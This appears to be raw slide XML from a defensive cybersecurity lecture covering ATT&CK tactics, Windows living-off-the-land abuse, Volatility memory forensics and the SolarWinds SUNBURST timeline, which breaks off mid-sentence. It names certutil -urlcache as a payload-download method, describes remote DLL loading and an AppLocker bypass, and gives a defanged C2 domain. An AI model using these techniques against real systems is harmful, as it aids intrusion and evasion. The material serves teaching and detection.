                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Impact</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>TA0040</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Disrupting or destroying systems</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1486 Data Encrypted for Impact</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFA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Living Off the Land (LoTL) Techniques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Living Off the Land (LoTL)</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> attacks use legitimate operating system tools and features to execute malicious actions, making them difficult to detect with signature-based methods because no custom malware is deployed.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Living Off the Land (LoTL) Techniques (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_living_off_land_technique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LoTL abuse map: native Windows administration tools re-purposed as attack tools by adversaries seeking to blend in with legitimate administrative traffic.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Living Off the Land (LoTL) Techniques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Tool</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Normal Use</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Attacker Abuse</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>ATT&amp;CK Technique</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="B3001B"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>PowerShell</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Automation and administration</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Remote code execution, reconnaissance, credential theft</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1059.001</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>WMI</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>System management queries</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Persistent event subscriptions, lateral movement</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1047, T1546.003</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>certutil.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Certificate management</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Downloading payloads from the internet (</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                          <a:latin typeface="Consolas"/>
                        </a:rPr>
                        <a:t>certutil -urlcache</a:t>
                      </a:r>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T1105</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>mshta.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Runs HTML Applications (.hta)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Executing malicious scripts hosted on attacker infrastructure</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1218.005</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>regsvr32.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Registers COM DLLs</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Loading remote malicious DLLs, bypassing AppLocker</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1218.010</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303308">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>rundll32.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Runs DLL entry points</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Executing malicious DLL payloads while appearing legitimate</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>T1218.011</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFA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Forensics with the Volatility Framework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Volatility Framework</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> is an open-source memory forensics platform that extracts running processes, network connections, injected code, and encryption keys from raw RAM images captured from live or compromised systems.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Forensics with the Volatility Framework (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_volatility_memory_forensics.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2421134"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="37911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Volatility memory forensics workflow: plugins operate against a raw RAM image to extract artifacts that no longer exist on disk after system shutdown.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Forensics with the Volatility Framework (3/3)</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Acquire Memory Image:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Use WinPMEM or Magnet RAM Capture to create a bit-for-bit copy of physical RAM while the system is live.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Identify Profile:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>volatility -f memory.raw imageinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to identify the operating system version and kernel build.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>List Processes:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>pslist</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>pstree</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to enumerate running processes and identify orphaned or suspicious parent-child relationships.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Scan Network Connections:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>netscan</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to list active and recently closed TCP/UDP connections, including the owning process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detect Injection:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Run </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>malfind</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to identify memory regions with executable permissions that do not map to a file on disk, a primary indicator of process injection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Extract Artifacts:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Dump suspicious processes with </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>procdump</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and pass hashes to VirusTotal or a local YARA scanner.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SolarWinds SUNBURST</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> supply chain compromise (December 2020) is the most significant cyber espionage operation ever publicly disclosed, affecting over eighteen thousand organizations including US federal agencies. It demonstrates the limits of perimeter-based detection.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 (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_solarwinds_sunburst_timeline.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="4235335"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="560533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SUNBURST campaign timeline: a supply chain insertion in October 2019 went undetected for fourteen months, demonstrating how behavioral dormancy defeats time-based detection heuristics.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 (3/3)</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Supply Chain Insertion (Oct 2019):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Attackers compromised SolarWinds' build environment and inserted malicious code into the Orion software build pipeline.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trojanized Update Distribution (Mar 2020):</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> The backdoored Orion update (version 2019.4 through 2020.2.1) was digitally signed and distributed to SolarWinds customers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fourteen-Day Dormancy:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SUNBURST waited fourteen days before activating C2 communications, defeating behavioral tools that use short observation windows.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain Generation &amp; C2:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> SUNBURST contacted </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>avsvmcloud[.]com</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="201C1A"/>
